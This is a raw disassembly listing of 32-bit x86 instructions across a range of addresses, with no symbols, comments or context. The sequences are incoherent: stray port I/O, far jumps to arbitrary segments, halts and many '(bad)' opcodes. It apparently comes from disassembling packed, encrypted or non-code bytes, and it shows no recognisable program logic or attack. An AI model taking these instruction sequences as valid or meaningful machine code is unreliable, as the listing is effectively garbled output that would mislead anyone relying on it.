  42765e:	test   DWORD PTR [edi-0x425733f],esi
  427664:	ins    DWORD PTR es:[edi],dx
  427665:	cs retf 
  427667:	int3   
  427668:	pop    ss
  427669:	pop    ebp
  42766a:	mov    esp,0x2c36be63
  42766f:	shr    BYTE PTR [esi+0x6c],0x38
  427673:	fild   DWORD PTR [ecx+0x6c]
  427676:	sar    BYTE PTR [bx+si],0xf4
  42767a:	pop    edi
  42767b:	aam    0x53
  42767d:	mov    ds:0x7f90619a,al
  427682:	sub    bh,al
  427684:	mov    edi,DWORD PTR [edx-0x72]
  427687:	lea    ebp,[esi-0x28c174bb]
  42768d:	outs   dx,BYTE PTR ds:[esi]
  42768e:	enter  0xf1b7,0x0
	...
  4276f2:	add    BYTE PTR [eax],al
  4276f4:	add    DWORD PTR [esi-0x70],edx
  4276f7:	out    dx,al
  4276f8:	xlat   BYTE PTR ds:[ebx]
  4276f9:	out    dx,al
  4276fa:	jg     0x4276fb
  4276fc:	in     al,dx
  4276fd:	xor    al,0x86
  4276ff:	fldenv [ebp+ebp*8-0x5a134ad4]
  427706:	add    DWORD PTR [eax],eax
  427708:	add    eax,0xd5000001
  42770d:	lds    edi,FWORD PTR [edx+0x43]
  427710:	cwde   
  427711:	mov    bh,BYTE PTR [edx]
  427713:	call   0x3082:0xbc0540fb
  42771a:	(bad)  
  42771c:	fstp   st(4)
  42771e:	lock bound ecx,QWORD PTR [esi+0x4a34d22d]
  427725:	cmc    
  427726:	hlt    
  427727:	ds or  eax,esp
  42772a:	shl    BYTE PTR [edx],cl
  42772c:	push   ecx
  42772d:	push   esp
  42772e:	bsr    ecx,DWORD PTR [eax]
  427731:	aam    0x8e
  427733:	mov    eax,ds:0xfaa20195
  427738:	js     0x427743
  42773a:	sub    DWORD PTR [edi+0x2d],esp
  42773d:	fsubr  st(6),st
  42773f:	add    eax,0xcf92fafb
  427744:	cwde   
  427745:	push   ebp
  427746:	push   ebp
  427747:	and    al,0x25
  427749:	fcom   DWORD PTR [eax+0x6d5866aa]
  42774f:	mov    DWORD PTR [edx-0x56e4563e],edx
  427755:	mov    eax,ds:0x573a9193
  42775a:	aam    0x9a
  42775c:	sub    edx,DWORD PTR [edx+0x6c5c58b]
  427762:	loopne 0x4276fb
  427764:	xor    DWORD PTR [edx+0x5a4e79a0],esi
  42776a:	je     0x3efde401
  427770:	pop    ss
  427771:	imul   esi,ebp,0x8
  427774:	ins    DWORD PTR es:[edi],dx
  427775:	dec    ebp
  427776:	sub    al,0xb1
  427778:	scas   eax,DWORD PTR es:[edi]
  427779:	mov    ds:0x345ef242,eax
  42777e:	or     DWORD PTR [edi+0x1dd03e39],eax
  427784:	sub    al,0xc1
  427786:	shufps xmm7,xmm4,0x69
  42778a:	cli    
  42778b:	mov    ebx,0x59fb8809
  427790:	sbb    BYTE PTR [esi],cl
  427792:	(bad)  
  427793:	mov    ds:0x5becce6e,al
  427798:	lahf   
  427799:	repnz mov ebp,0xf5c22bae
  42779f:	icebp  
  4277a0:	outs   dx,DWORD PTR ds:[esi]
  4277a1:	bound  ecx,QWORD PTR [ecx+eiz*2]
  4277a4:	mov    ah,BYTE PTR [eax+0x4e]
  4277a7:	or     BYTE PTR [ebx+0xe27334],bl
  4277ad:	in     eax,dx
  4277ae:	int3   
  4277af:	shr    edx,0x5d
  4277b2:	mov    esp,0x7ab889cd
  4277b7:	mov    WORD PTR [ebp-0x5d6487ed],cs
  4277bd:	jnp    0x427813
  4277bf:	mov    cs,ecx
  4277c1:	stos   BYTE PTR es:[edi],al
  4277c2:	mov    dl,0x3c
  4277c4:	jecxz  0x4277bf
  4277c6:	sub    eax,DWORD PTR ds:0x70e63745
  4277cc:	in     eax,dx
  4277cd:	jmp    0xc7b5:0xc91c98bf
  4277d4:	hlt    
  4277d5:	mov    edx,0x1b91c818
  4277da:	and    ch,ch
  4277dc:	add    eax,ebx
  4277de:	repz lea esi,[esi+0x3726ccd2]
  4277e5:	mov    esp,0xf91a5fab
  4277ea:	stc    
  4277eb:	fs ins BYTE PTR es:[edi],dx
  4277ed:	dec    edx
  4277ee:	jmp    0x6f3a:0x78526860
  4277f5:	mov    es,WORD PTR [eax]
  4277f7:	rcr    BYTE PTR [esp+eiz*4+0x78],1
  4277fb:	mov    ds:0x8233bf46,eax
  427800:	mov    al,ds:0x3bbd388c
  427805:	jbe    0x4277c6
  427807:	or     al,0xa4
  427809:	das    
  42780a:	clc    
  42780b:	and    ebx,ecx
  42780d:	dec    edx
  42780e:	movntps XMMWORD PTR [ebx+0x0],xmm4
	...
  427871:	add    BYTE PTR [eax],al
  427873:	add    BYTE PTR [edx],bl
  427875:	mov    cl,BYTE PTR [ebx]
  427877:	inc    ebp
  427878:	fwait
  427879:	lds    ebx,FWORD PTR [esi-0x21]
  42787c:	jo     0x4278e3
  42787e:	fldl2e 
  427880:	scas   al,BYTE PTR es:[edi]
  427881:	add    DWORD PTR [eax-0x26],ebx
  427884:	icebp  
  427885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427886:	add    DWORD PTR [eax],eax
  427888:	add    eax,0xbc000001
  42788d:	aad    0xb
  42788f:	inc    edx
  427890:	mov    esp,0xfed97569
  427895:	retf   0x6186
  427898:	push   es
  427899:	es or  al,0x52
  42789c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42789d:	hlt    
  42789e:	pop    ebx
  42789f:	pop    esp
  4278a0:	in     eax,0x79
  4278a2:	test   eax,0x3b7a2995
  4278a7:	push   edi
  4278a8:	leave  
  4278a9:	xor    DWORD PTR [ebp-0x2b],esp
  4278ac:	jge    0x4278ce
  4278ae:	mov    al,0x19
  4278b0:	fbld   TBYTE PTR [ebx+0x2218472b]
  4278b6:	div    DWORD PTR ds:[edi+0x4d]
  4278ba:	jmp    0x1071:0xfb880897
  4278c1:	test   al,0xa7
  4278c3:	sahf   
  4278c4:	repz addr16 mov ebp,0x924f8efb
  4278cb:	pop    eax
  4278cc:	pop    esi
  4278cd:	add    ecx,esi
  4278cf:	sbb    BYTE PTR [ebp+0x26ee83b],ch
  4278d5:	push   es
  4278d6:	mov    eax,ds:0x93423c3c
  4278db:	sub    DWORD PTR [ebx],0x4b
  4278de:	sub    DWORD PTR [edx],eax
  4278e0:	jp     0x427889
  4278e2:	pop    esi
  4278e3:	add    edi,esi
  4278e5:	dec    ebx
  4278e6:	les    esp,FWORD PTR fs:[edx+0x69]
  4278ea:	jl     0x427897
  4278ec:	mov    ss,WORD PTR [esi-0x10862dbf]
  4278f2:	popf   
  4278f3:	cmp    BYTE PTR [edi-0xa],ch
  4278f6:	or     eax,0x645784c5
  4278fb:	test   al,0x42
  4278fd:	fist   WORD PTR [edi-0x45e8bd3b]
  427903:	pop    ebp
  427904:	cli    
  427905:	cld    
  427906:	jp     0x427985
  427908:	into   
  427909:	es ins BYTE PTR es:[edi],dx
  42790b:	leave  
  42790c:	fild   WORD PTR [ecx+0x55]
  42790f:	nop
  427910:	aaa    
  427911:	(bad)  
  427912:	fild   DWORD PTR [esp+edi*8+0x6c]
  427916:	jmp    0x4278fc
  427918:	js     0x427994
  42791a:	aad    0xd3
  42791c:	in     al,0xe9
  42791e:	xor    BYTE PTR [esi-0x1e],cl
  427921:	mov    ds:0x7da07600,eax
  427926:	repnz mov WORD PTR [edi+0x1c],gs
  42792a:	idiv   DWORD PTR [ebp+0x4a]
  42792d:	add    dl,al
  42792f:	shl    DWORD PTR [ebp+0x7e3f7475],0x61
  427936:	cmp    DWORD PTR [edi+edx*8-0x897845f],edi
  42793d:	cmp    dh,ah
  42793f:	mov    bh,BYTE PTR [esi+0x21ab7215]
  427945:	push   edi
  427946:	loop   0x42792a
  427948:	sbb    dh,0x15
  42794b:	mov    esp,0x61121cbc
  427950:	scas   al,BYTE PTR es:[edi]
  427951:	icebp  
  427952:	enter  0xd86f,0x5c
  427956:	mov    esp,0x3ee5c89b
  42795b:	mov    esp,0xb21fede2
  427960:	out    dx,eax
  427961:	xchg   edi,eax
  427962:	scas   al,BYTE PTR es:[edi]
  427963:	jl     0x427996
  427965:	das    
  427966:	in     eax,0x32
  427968:	inc    ebx
  427969:	jg     0x427946
  42796b:	or     edi,eax
  42796d:	dec    edi
  42796e:	jae    0x427968
  427970:	adc    DWORD PTR [edi-0x7f1a1d50],0x4a4ce1d1
  42797a:	retf   0x34ab
  42797d:	pop    ss
  42797e:	xchg   ecx,eax
  42797f:	lods   eax,DWORD PTR ds:[esi]
  427980:	pop    ebx
  427981:	popa   
  427982:	or     DWORD PTR [ecx+0x49],ebp
  427985:	call   0x9d57096c
  42798a:	xor    al,0xf6
  42798c:	mov    ebx,0xbc0e42f3
	...
  4279f1:	add    BYTE PTR [eax],al
  4279f3:	add    BYTE PTR [edx-0x5c0023],bl
  4279f9:	mov    ds:0x7542fdde,eax
  4279fe:	fadd   DWORD PTR [ebx-0x1c4b8aa]
  427a04:	mul    BYTE PTR [edi+0x1050001]
  427a0a:	add    BYTE PTR [eax],al
  427a0c:	int    0xe3
  427a0e:	outs   dx,BYTE PTR ds:[esi]
  427a0f:	mov    ecx,0xe5ed222b
  427a14:	ins    BYTE PTR es:[edi],dx
  427a15:	pop    esi
  427a16:	test   bh,bh
  427a18:	out    dx,al
  427a19:	cmp    ax,0x19ed
  427a1d:	adc    eax,0xfba8a2a1
  427a22:	xchg   ecx,eax
  427a23:	jle    0x4279fc
  427a25:	jns    0x427a93
  427a27:	ds jp  0x427a46
  427a2a:	jno    0x4279f9
  427a2c:	lahf   
  427a2d:	fistp  DWORD PTR [ecx-0x56]
  427a30:	and    DWORD PTR [edi+eax*2-0x6009577a],edi
  427a37:	sar    BYTE PTR [edx],1
  427a39:	bound  ebp,QWORD PTR [eax+0x39ed48d5]
  427a3f:	int    0xe4
  427a41:	in     eax,dx
  427a42:	std    
  427a43:	aas    
  427a44:	sub    ah,BYTE PTR [edi+ebx*2]
  427a47:	fidivr WORD PTR [edx+edx*2-0x73d32f7d]
  427a4e:	push   0xfd873a8
  427a53:	retf   
  427a54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a55:	fimul  DWORD PTR [edi-0x71]
  427a58:	in     eax,dx
  427a59:	xchg   esp,eax
  427a5a:	ja     0x427a9c
  427a5c:	aas    
  427a5d:	mov    eax,ds:0x9ec7aa91
  427a62:	xlat   BYTE PTR ds:[ebx]
  427a63:	mov    ch,BYTE PTR [ecx]
  427a65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a66:	sub    eax,ecx
  427a68:	jmp    0x9e89:0x14074402
  427a6f:	out    dx,al
  427a70:	xchg   DWORD PTR [edi+0x5c],esp
  427a73:	retf   0x59d5
  427a76:	jo     0x427a9d
  427a78:	aad    0x94
  427a7a:	cdq    
  427a7b:	leave  
  427a7c:	loop   0x427a88
  427a7e:	aas    
  427a7f:	shl    BYTE PTR [edx+0x3e],0x97
  427a83:	loope  0x427ab9
  427a85:	js     0x427a63
  427a87:	inc    ebp
  427a88:	arpl   cx,dx
  427a8a:	push   es
  427a8b:	stos   DWORD PTR es:[edi],eax
  427a8c:	mov    BYTE PTR [ebx],al
  427a8e:	aas    
  427a8f:	pop    ecx
  427a90:	fidivr DWORD PTR [edx+0x54]
  427a93:	push   ebp
  427a94:	jmp    0x427adb
  427a96:	cmp    DWORD PTR [eax],0x7fbfb0
  427a9c:	xor    al,0xef
  427a9e:	fidiv  DWORD PTR [esi-0x2aa97506]
  427aa4:	mov    edi,0xca9807ef
  427aa9:	retf   0xe89b
  427aac:	sbb    DWORD PTR [edx-0xcb7d284],eax
  427ab2:	or     ch,BYTE PTR [esi+0x38]
  427ab5:	xchg   BYTE PTR [ebp-0x52c9d954],dl
  427abb:	imul   ecx,eax,0xffffffa7
  427abe:	rol    ah,cl
  427ac0:	ss call 0xe3f4:0xa72c4796
  427ac8:	sub    edx,ebp
  427aca:	xchg   esp,eax
  427acb:	xchg   edi,eax
  427acc:	scas   al,BYTE PTR es:[edi]
  427acd:	sub    eax,0x2e0bb5e4
  427ad2:	fmul   QWORD PTR [eax+eiz*2+0x14]
  427ad6:	jnp    0x427abf
  427ad8:	jecxz  0x427ade
  427ada:	stos   BYTE PTR es:[edi],al
  427adb:	fdiv   DWORD PTR ds:0x9581e9bf
  427ae1:	cdq    
  427ae2:	aad    0xa3
  427ae4:	mov    eax,0x75fcd691
  427ae9:	xchg   esp,eax
  427aea:	jno    0x427b39
  427aec:	mov    al,0xc9
  427aee:	int    0x51
  427af0:	jae    0x427b57
  427af2:	pop    eax
  427af3:	xor    BYTE PTR [ebx-0x61],bh
  427af6:	int3   
  427af7:	jmp    0x427a96
  427af9:	jge    0x427b69
  427afb:	mov    eax,ds:0x98115507
  427b00:	sbb    eax,0xd25bad3d
  427b05:	and    DWORD PTR [esi-0x403e7318],edx
  427b0b:	or     DWORD PTR [edi-0x513f088e],0x0
	...
  427b72:	add    BYTE PTR [eax],al
  427b74:	retf   0x528b
  427b77:	jnp    0x427bcc
  427b79:	sti    
  427b7a:	jmp    0x427b37
  427b7c:	push   ecx
  427b7d:	mov    ecx,ebx
  427b7f:	not    cl
  427b81:	retf   0xe88d
  427b84:	sti    
  427b85:	test   al,0x1
  427b87:	add    BYTE PTR ds:0x60000001,al
  427b8d:	out    0x94,al
  427b8f:	mov    DWORD PTR [edi-0x45],ebp
  427b92:	mov    WORD PTR [edx-0x33],?
  427b95:	fdiv   QWORD PTR [esi+0x3861a72a]
  427b9b:	in     eax,dx
  427b9c:	jmp    0xdebf:0x207eeefc
  427ba3:	add    BYTE PTR [edi-0x8],cl
  427ba6:	mov    edx,0x8e337d8
  427bab:	retf   
  427bac:	jle    0x427bca
  427bae:	cs sbb eax,0xc655dad2
  427bb4:	inc    edi
  427bb5:	push   ebp
  427bb6:	fst    QWORD PTR [esi-0x7f]
  427bb9:	mov    WORD PTR [ecx+0xac77f20],es
  427bbf:	ret    0x8b0f
  427bc2:	test   BYTE PTR [ebx-0x49943954],cl
  427bc8:	fsub   DWORD PTR [esi-0x2d8740cf]
  427bce:	ss push ss
  427bd0:	lea    esi,[ebx-0x4ee81bbf]
  427bd6:	mov    ds:0x9fa4136f,eax
  427bdb:	push   cs
  427bdc:	lods   al,BYTE PTR ds:[esi]
  427bdd:	aas    
  427bde:	out    dx,eax
  427bdf:	pop    esp
  427be0:	dec    esi
  427be1:	in     eax,dx
  427be2:	ret    
  427be3:	pop    es
  427be4:	mov    ebx,0x626487c4
  427be9:	push   0xffffff8e
  427beb:	mov    ebp,0x690b35ae
  427bf0:	adc    edx,DWORD PTR [ecx+0x1d]
  427bf3:	cmc    
  427bf4:	inc    esp
  427bf5:	lea    ebp,[edx-0x72df2eae]
  427bfb:	(bad)  
  427bfd:	icebp  
  427bfe:	imul   sp,sp,0x8653
  427c03:	xor    ebp,DWORD PTR [esi-0x51]
  427c06:	and    al,0x77
  427c08:	mov    esp,?
  427c0a:	dec    esp
  427c0b:	iret   
  427c0c:	jbe    0x427c3d
  427c0e:	mov    edi,0x1b1dc7fe
  427c13:	push   ds
  427c14:	inc    ecx
  427c15:	iret   
  427c16:	es daa 
  427c18:	inc    edi
  427c19:	push   edi
  427c1a:	icebp  
  427c1b:	mov    edx,0x65c26eda
  427c20:	lds    ebp,FWORD PTR [eax-0x23b37b58]
  427c26:	pop    es
  427c27:	sub    DWORD PTR [esi+0x32],edx
  427c2a:	cmp    al,0x5b
  427c2c:	or     ch,BYTE PTR [ebp+0x17]
  427c2f:	jmp    0x234d380d
  427c34:	inc    ebp
  427c35:	popf   
  427c36:	xchg   ebp,eax
  427c37:	pop    eax
  427c38:	icebp  
  427c39:	lods   eax,DWORD PTR ds:[esi]
  427c3a:	lea    edx,ss:[ecx-0x72a9dd6b]
  427c41:	adc    al,0xed
  427c43:	xchg   esp,eax
  427c44:	in     al,dx
  427c45:	adc    BYTE PTR [edx+0x1fb693a8],dh
  427c4b:	mov    esi,0x6c4f1918
  427c50:	in     eax,dx
  427c51:	fadd   st,st(4)
  427c53:	fdivr  DWORD PTR [edi+0x5b]
  427c56:	inc    ecx
  427c57:	imul   edx,eax,0xffffffdf
  427c5a:	xchg   ecx,eax
  427c5b:	loop   0x427c78
  427c5d:	bound  eax,QWORD PTR [ebx-0x19]
  427c60:	inc    edx
  427c61:	jl     0x427cb5
  427c63:	inc    ecx
  427c64:	stc    
  427c65:	inc    ecx
  427c66:	daa    
  427c67:	mov    esi,0x32774f5f
  427c6c:	jmp    DWORD PTR [eax]
  427c6e:	add    BYTE PTR [edx-0x45],0x1a
  427c72:	pop    esi
  427c73:	stc    
  427c74:	mov    fs,WORD PTR [ebp-0x46]
  427c77:	les    esi,FWORD PTR [edx]
  427c79:	pop    ecx
  427c7a:	enter  0x6fe,0x91
  427c7e:	sub    bh,0x96
  427c81:	frstor [eax+0x60a08b8e]
  427c87:	mov    ecx,0x1a2fb6e5
  427c8c:	mov    bl,0xeb
  427c8e:	push   edi
  427c8f:	cmp    DWORD PTR [eax+0x0],0x0
	...
  427cf3:	add    BYTE PTR [ebx-0xcbc4fb0],ah
  427cf9:	jecxz  0x427cee
  427cfb:	lock xchg DWORD PTR ds:0xd655d44,ebx
  427d02:	call   0x1ec7dcb
  427d07:	add    BYTE PTR ds:0x77000001,al
  427d0d:	repz clc 
  427d0f:	daa    
  427d10:	daa    
  427d11:	fistp  QWORD PTR [ebx+edx*4-0x7eba7dfc]
  427d18:	(bad)  
  427d19:	outs   dx,BYTE PTR ds:[esi]
  427d1b:	mov    al,dl
  427d1d:	inc    edx
  427d1e:	cmc    
  427d1f:	fwait
  427d20:	aas    
  427d21:	out    dx,eax
  427d22:	adc    esp,ecx
  427d24:	jbe    0x427ce8
  427d26:	cmp    ebp,esp
  427d28:	scas   eax,DWORD PTR es:[edi]
  427d29:	mov    edx,0x17b057a4
  427d2e:	jmp    0xc536:0x9e617a3d
  427d35:	pop    edi
  427d36:	sub    BYTE PTR [eax+0x71353fcc],bl
  427d3c:	push   eax
  427d3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427d3e:	nop
  427d3f:	pop    ds
  427d40:	ja     0x427d3c
  427d42:	pushf  
  427d43:	arpl   WORD PTR [eax-0x4],si
  427d46:	pop    eax
  427d47:	adc    eax,0x79120103
  427d4c:	sub    DWORD PTR [edx+eax*1+0x5e4939d2],esi
  427d53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427d54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427d55:	jmp    0x48dc24db
  427d5a:	xor    BYTE PTR [ecx+edx*1-0x2dbfb6f0],dl
  427d61:	cmp    eax,0x4d885aca
  427d66:	imul   esp,DWORD PTR [ecx-0x5],0x7b23ba31
  427d6d:	mov    eax,0x15883e
  427d72:	pop    edx
  427d73:	mov    esi,DWORD PTR [ecx]
  427d75:	sti    
  427d76:	dec    edx
  427d77:	adc    eax,0xe2eb1d1d
  427d7c:	sbb    bh,BYTE PTR [edi]
  427d7e:	dec    ebp
  427d7f:	mov    edi,0xe8d1a48f
  427d84:	dec    ah
  427d86:	or     BYTE PTR [ecx+0x15389be1],al
  427d8c:	in     al,dx
  427d8d:	lahf   
  427d8e:	loopne 0x427db6
  427d90:	ss xchg esp,eax
  427d92:	and    DWORD PTR [eax+0x30],esp
  427d95:	jo     0x427dba
  427d97:	inc    eax
  427d98:	fiadd  DWORD PTR [ecx+0x155d9767]
  427d9e:	ror    DWORD PTR [ecx],1
  427da0:	pop    ebx
  427da1:	jmp    0x427dc1
  427da3:	push   ss
  427da4:	clc    
  427da5:	retf   0xadc
  427da8:	fbstp  TBYTE PTR [ebx]
  427daa:	push   edi
  427dab:	in     eax,0x5
  427dad:	cmp    esp,esp
  427daf:	add    DWORD PTR [ebx+0x5d],ebp
  427db2:	ret    
  427db3:	jo     0x427dc0
  427db5:	rcl    DWORD PTR [ecx],1
  427db7:	jbe    0x427dda
  427db9:	add    dl,BYTE PTR [edx]
  427dbb:	pop    esi
  427dbc:	cld    
  427dbd:	ins    BYTE PTR es:[edi],dx
  427dbe:	test   DWORD PTR ds:0x863f9fb7,ecx
  427dc4:	ja     0x427d51
  427dc6:	fild   QWORD PTR [ecx]
  427dc8:	mov    edx,esp
  427dca:	jge    0x427e0b
  427dcc:	pop    edi
  427dce:	sbb    al,0x85
  427dd0:	mov    DWORD PTR [ebp+edx*2+0xa],edi
  427dd4:	(bad)  
  427dd5:	sub    al,0xf9
  427dd7:	xchg   ecx,eax
  427dd8:	or     ah,BYTE PTR [ecx]
  427dda:	pop    esp
  427ddb:	test   eax,0xe1f28f80
  427de0:	into   
  427de1:	sar    DWORD PTR es:0x42f50a07,1
  427de8:	add    DWORD PTR [eax-0x986f407],edx
  427dee:	stc    
  427def:	mov    WORD PTR [edx+0x1d],gs
  427df2:	lock inc edi
  427df4:	imul   edi,esp,0xffffff84
  427df7:	loope  0x427e6b
  427df9:	cmp    eax,0x5d836683
  427dfe:	in     al,0x3d
  427e00:	cmp    al,0xb2
  427e02:	mov    edi,0x78ba27ba
  427e07:	cmc    
  427e08:	(bad)  
  427e0a:	dec    DWORD PTR [eax+0x1]
  427e0d:	fbld   TBYTE PTR [edi+0x23]
  427e10:	or     BYTE PTR [eax],al
	...
  427e72:	add    BYTE PTR [eax],al
  427e74:	mov    eax,0x6d3c25f1
  427e79:	cld    
  427e7a:	mov    ecx,0x2bc293f5
  427e7f:	leave  
  427e80:	das    
  427e81:	in     al,dx
  427e82:	nop
  427e83:	fs add eax,0x50001ab
  427e89:	add    DWORD PTR [eax],eax
  427e8b:	add    BYTE PTR [esi],dh
  427e8d:	(bad)  
  427e8e:	loopne 0x427efa
  427e90:	fwait
  427e91:	das    
  427e92:	daa    
  427e93:	stos   DWORD PTR es:[edi],eax
  427e94:	dec    eax
  427e95:	add    eax,0xaea8a37
  427e9a:	sub    BYTE PTR [edi],bl
  427e9c:	(bad)  
  427e9d:	adc    esp,DWORD PTR [edx]
  427e9f:	jle    0x427f0d
  427ea1:	dec    esp
  427ea2:	hlt    
  427ea3:	cmp    esp,edi
  427ea5:	xchg   edi,eax
  427ea6:	xor    ebp,DWORD PTR [ecx-0x216246d7]
  427eac:	pop    eax
  427ead:	stc    
  427eae:	mov    DWORD PTR [edi+ebp*4+0x2015d984],ebx
  427eb5:	das    
  427eb6:	mov    ebx,0x14dd9b57
  427ebb:	fisttp QWORD PTR [eax+edx*8]
  427ebe:	cmp    BYTE PTR [esi],cl
  427ec0:	pop    ebx
  427ec1:	aas    
  427ec2:	dec    esi
  427ec3:	lods   al,BYTE PTR ds:[esi]
  427ec4:	push   ds
  427ec5:	retf   
  427ec6:	ficomp DWORD PTR [ebx+0x64]
  427ec9:	inc    ebp
  427eca:	xchg   DWORD PTR [eax+edx*4],esi
  427ecd:	int3   
  427ece:	(bad)  
  427ecf:	out    0x72,eax
  427ed1:	inc    edi
  427ed2:	aas    
  427ed3:	aam    0x6a
  427ed5:	push   edx
  427ed6:	adc    esi,DWORD PTR [ebp+0x75]
  427ed9:	fistp  QWORD PTR [edx+0x7d]
  427edc:	fwait
  427edd:	fs mov esi,0x5fac3b6f
  427ee3:	dec    eax
  427ee4:	mov    WORD PTR [esi+0x1f],?
  427ee7:	pop    esi
  427ee8:	xlat   BYTE PTR ds:[ebx]
  427ee9:	cmp    eax,0xaf66832
  427eee:	inc    ebp
  427eef:	xor    bh,ah
  427ef1:	sahf   
  427ef2:	test   edi,esp
  427ef4:	jge    0x427ebc
  427ef6:	adc    al,0xef
  427ef8:	xchg   esi,eax
  427ef9:	shl    BYTE PTR [ebp+0x66171d6a],1
  427eff:	and    cl,ch
  427f01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427f02:	pop    edi
  427f03:	cmp    BYTE PTR [esi],dh
  427f05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427f06:	sub    al,0xf8
  427f08:	push   0xf82026a0
  427f0d:	sub    ebp,DWORD PTR [ebx+0x9]
  427f10:	cmp    cl,BYTE PTR [esi-0x7e]
  427f13:	das    
  427f14:	call   0xec71d591
  427f19:	sub    dh,BYTE PTR [ebx]
  427f1b:	(bad)  
  427f1c:	xlat   BYTE PTR ds:[ebx]
  427f1d:	push   esp
  427f1e:	inc    esp
  427f1f:	mov    ebx,0x98eaf504
  427f24:	xor    ah,BYTE PTR [ebp+0x1a]
  427f27:	mov    DWORD PTR [ebx-0x7a123a7e],eax
  427f2d:	fwait
  427f2e:	repnz mov esp,0x8613b724
  427f34:	test   DWORD PTR gs:[edi+ebx*4+0x57f29b3a],esi
  427f3c:	adc    bh,BYTE PTR [edx-0x43]
  427f3f:	mov    eax,0xef68443
  427f44:	xlat   BYTE PTR ds:[ebx]
  427f45:	neg    BYTE PTR cs:[ecx-0x63]
  427f49:	stc    
  427f4a:	jmp    0x3d05009e
  427f4f:	pop    ebx
  427f50:	test   eax,0x43d91e41
  427f55:	call   0x3d38e648
  427f5a:	or     eax,0xd32cc0c7
  427f5f:	dec    edx
  427f60:	inc    esp
  427f61:	mov    al,ds:0xaf20666
  427f66:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  427f68:	ja     0x427fad
  427f6a:	repz out 0x94,al
  427f6d:	loop   0x427f1d
  427f6f:	fnsave [eax+0x9f9b34d]
  427f75:	push   edi
  427f76:	or     edx,DWORD PTR [eax+edx*1-0x3f]
  427f7a:	mov    ah,0x14
  427f7c:	jp     0x427ff5
  427f7e:	or     al,0x9d
  427f80:	neg    DWORD PTR [esi+0x7b4b11c2]
  427f86:	push   edx
  427f87:	stc    
  427f88:	(bad)  
  427f89:	jecxz  0x427f37
  427f8b:	popa   
  427f8c:	pop    ebx
  427f8d:	or     edx,edi
  427f8f:	sub    eax,0x3e
	...
  427ff4:	mov    cl,0xa7
  427ff6:	dec    ebx
  427ff7:	das    
  427ff8:	pop    edi
  427ff9:	out    dx,eax
  427ffa:	cmc    
  427ffb:	mov    edi,0x22b0803f
  428000:	cmp    BYTE PTR [esi-0x7a],dh
  428003:	and    eax,0x1ac0a
  428008:	add    eax,0xa0000001
  42800d:	cs and al,0xd8
  428010:	jle    0x427fe5
  428012:	out    0x72,eax
  428014:	les    ecx,FWORD PTR [eax]
  428016:	pushf  
  428017:	jg     0x427fbd
  428019:	jge    0x42801d
  42801b:	or     ch,ch
  42801d:	sub    ah,BYTE PTR [ebp-0x3a]
  428020:	add    dl,BYTE PTR [ebx]
  428022:	cmp    DWORD PTR [edi-0x30da3ea5],esp
  428028:	adc    eax,0x4a6716df
  42802d:	test   BYTE PTR [edi],bh
  42802f:	repz xchg edx,eax
  428031:	cmp    ebx,ecx
  428033:	dec    edi
  428034:	sub    DWORD PTR [ebx],edx
  428036:	xor    bl,BYTE PTR [esi*2+0x335ab501]
  42803d:	add    DWORD PTR [edx-0x707de93c],eax
  428043:	sub    eax,0x77e61680
  428048:	stos   BYTE PTR es:[edi],al
  428049:	loope  0x427fd3
  42804b:	lods   eax,DWORD PTR ds:[esi]
  42804c:	adc    edi,DWORD PTR [ecx-0x39485d03]
  428052:	sbb    al,0x54
  428054:	imul   ecx,DWORD PTR [ebp+0xb05c294],0x208a0580
  42805e:	nop
  42805f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428060:	loop   0x42807d
  428062:	mov    eax,0xe9c8dafd
  428067:	mov    bh,0x80
  428069:	sahf   
  42806a:	mov    ebp,0xdc9f54a6
  42806f:	cmp    BYTE PTR [edi+0x64],ah
  428072:	mov    bl,0x32
  428074:	pop    eax
  428075:	aam    0x13
  428077:	out    0x28,eax
  428079:	sbb    eax,0x41d6481b
  42807e:	out    dx,al
  42807f:	retf   0x4933
  428082:	(bad)  
  428083:	sar    DWORD PTR [eax+0x7562e559],0xf4
  42808a:	sahf   
  42808b:	xchg   BYTE PTR [ebp+0x52],dl
  42808e:	cmc    
  42808f:	pop    ds
  428090:	in     eax,dx
  428091:	adc    ch,ch
  428093:	out    0x67,al
  428095:	(bad)  
  428096:	mov    edx,edx
  428098:	retf   
  428099:	dec    eax
  42809a:	sbb    DWORD PTR [ecx],0x9f87d0fc
  4280a0:	add    BYTE PTR [eax],al
  4280a2:	into   
  4280a3:	adc    dl,ah
  4280a5:	add    bl,BYTE PTR [esi-0x3aeb867e]
  4280ab:	scas   eax,DWORD PTR es:[edi]
  4280ac:	in     al,0x78
  4280ae:	adc    esi,DWORD PTR [ecx+esi*8-0x136496ad]
  4280b5:	sbb    al,0x97
  4280b7:	inc    esi
  4280b8:	(bad)  
  4280b9:	and    al,0x3a
  4280bb:	push   0x4b
  4280bd:	cs cmp edi,edx
  4280c0:	in     al,0xb2
  4280c2:	fwait
  4280c3:	xor    ebx,DWORD PTR [eax-0x53d98a76]
  4280c9:	inc    edx
  4280ca:	jb     0x428056
  4280cc:	cld    
  4280cd:	(bad)  
  4280ce:	mov    al,ds:0xba4734fe
  4280d3:	mov    ds:0x397b50af,eax
  4280d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4280d9:	(bad)  
  4280da:	adc    ah,BYTE PTR [esi+0xa]
  4280dd:	daa    
  4280de:	add    cl,BYTE PTR [ecx]
  4280e0:	lods   al,BYTE PTR ds:[esi]
  4280e1:	cmp    BYTE PTR [edx+esi*2+0x75c52de7],dl
  4280e8:	mov    ebp,0xe3a290a1
  4280ed:	cli    
  4280ee:	(bad)  
  4280ef:	inc    edx
  4280f0:	inc    ebx
  4280f1:	push   eax
  4280f2:	cmp    al,0xe9
  4280f4:	sub    DWORD PTR [edi-0x22cdc3a6],eax
  4280fa:	mov    eax,0xc0ed9493
  4280ff:	out    0x1e,eax
  428101:	sub    ch,BYTE PTR [edi-0x5f]
